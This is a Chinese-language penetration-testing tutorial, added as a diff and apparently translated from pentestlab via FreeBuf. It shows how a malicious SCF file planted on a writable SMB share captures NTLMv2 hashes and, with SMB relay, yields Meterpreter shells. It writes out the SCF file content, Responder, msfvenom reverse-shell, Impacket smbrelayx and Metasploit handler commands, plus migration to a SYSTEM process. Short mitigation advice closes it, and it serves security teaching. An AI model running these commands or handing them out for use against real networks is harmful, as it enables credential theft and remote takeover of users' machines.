@@ -1,0 +1,52 @@
+SMB是一种广泛用于企业组织中文件共享目的的网络协议。在内部的渗透测试中，发现包含明文密码和数据库连接字符串等敏感信息的共享文件并不罕见。但是，即使一个文件共享不包含任何可用于连接到其他系统的数据，但是未经身份验证的用户配置拥有该文件的写入权限，那么在这种情况下，攻击者也可以获得域用户的密码哈希值或Meterpreter shell。
+收集哈希
+SCF（Shell命令文件）文件可用于执行一组有限的操作，例如显示Windows桌面或打开Windows资源管理器，这并不是什么新鲜事。然而，一个SCF文件可以用来访问一个特定的UNC路径，允许渗透测试人员构建攻击。下面的代码可以被放置在一个文本文件，然后需要被植入到网络共享。
+[Shell] Command=2 IconFile=\\X.X.X.X\share\pentestlab.ico [Taskbar] Command=ToggleDesktop
+SCF文件的内容
+将pentestlab.txt文件保存为SCF文件，并且要使该文件在用户浏览文件时执行。在文件名前面添加@符号可以将pentestlab.scf放在共享驱动器文件列表的顶部。
+SCF文件
+Responder需要使用以下参数执行来捕获浏览共享的用户的哈希值。
+responder -wrf --lm -v -I eth0
+Responder – SCF的参数
+当用户浏览共享时，将自动会从系统建立网络连接，连接到包含在SCF文件内的UNC路径。Windows将尝试使用用户名和密码对该共享进行身份验证。在验证过程中，随机的8字节质询密钥会从服务器发送到客户端，散列后的NTLM / LANMAN密码再次使用这个质询密钥进行加密。Responder将捕获NTLMv2哈希。
+Responder -通过SCF抓取到的NTLMv2哈希
+除了Responder，Metasploit Framework也有一个模块，可以用来捕获来自SMB客户端的挑战 – 响应密码哈希。
+auxiliary/server/capture/smb
+Metasploit – 捕获SMB的模块
+和之前一样，用户在浏览相同的共享时，他的密码哈希将被Metasploit捕获。
+Metasploit -捕获NTLMv2
+如果公司内部的密码策略足够低，攻击者可能只需要几天或几个星期就能破解捕获到的密码散列。
+Meterpreter Shell
+上面的技术的主要优点是它不需要与用户有任何交互，并自动强制用户连接到共享，在这个过程中不存在NTLMv2哈希的协商过程。因此，也可以将此技术与SMB中继相结合，SMB中继将提供有效载荷，可以从访问该共享的每个用户检索Meterpreter Shell。
+MSFVenom可用于生成将在目标上执行的有效载荷：
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.171 LPORT=5555 -f exe > pentestlab.exe
+MSFVenom – 为SMB中继生成的payload
+Coresecurity已经发布了一个名为Impacket的Python脚本，可以对SMB等Windows协议执行各种攻击。使用smbrelayx 这个python脚本可以设置中继攻击并在当目标主机尝试连接SMB服务器时提供有效载荷。这将自动执行，因为SCF文件将强制每个用户使用他们自己的凭据连接到一个不存在的共享。
+./smbrelayx.py -h Target-IP -e ./pentestlab.exe
+Impacket – SMB中继服务器
+Metasploit框架需要使用并在目标上执行pentestlab.exe时接收连接。
+exploit/multi/handler
+模块需要配置与生成的有效载荷相同的参数。
+set payload windows/meterpreter/reverse_tcp set LHOST 192.168.1.171 set LPORT 5555 exploit
+Metasploit – 多处理程序模块
+当用户浏览共享时，SMB服务器将接收到连接，并且将使用用户名和密码散列来与他的系统进行认证，并将有效载荷执行为可写共享。
+Impacket – SMB中继攻击
+Meterpreter将收到一个会话。但是为了避免丢失连接，有必要迁移到更稳定的进程。
+Meterpreter – 列出正在运行的进程
+需要使用迁移命令和进程标识。
+Meterpreter – 进程迁移
+在这个例子中，进程1600对应于以SYSTEM权限运行的svchost.exe进程。
+Meterpreter – 迁移进程列表
+从Meterpreter控制台运行getuid将获得当前的UID，现在是SYSTEM。
+Meterpreter – 检索当前的UID
+Metasploit框架也可以实现同样的攻击。
+exploit/windows/smb/smb_relay set payload windows/meterpreter/reverse_tcp set LHOST 192.168.1.171 exploit
+Metasploit – SMB中继模块
+SMB服务器将建立一个通过使用用户名和密码哈希来验证目标的连接，在一个可写共享上传递一个有效载荷，以用户权限执行作为一个服务的有效载荷，执行清理并返回一个Meterpreter会话。
+Metasploit – SMB中继攻击
+可以使用sessions命令与现有会话执行交互。
+Metasploit – SMB中继会话
+结论
+这个技术利用了像共享这样的所有网络中很常见的东西，以便检索密码散列并获取meterpreter shell。唯一的要求是用户需要浏览包含恶意SCF文件的共享。但是，通过执行以下操作可以防止这些攻击：
+· 使用Kerberos身份验证和SMB签名 · 不允许未经身份验证的用户在文件共享中拥有写入权限 · 确保使用NTLMv2密码哈希代替LanMan
+*参考来源：pentestlab，作者liulang，转载请注明来自FreeBuf.COM
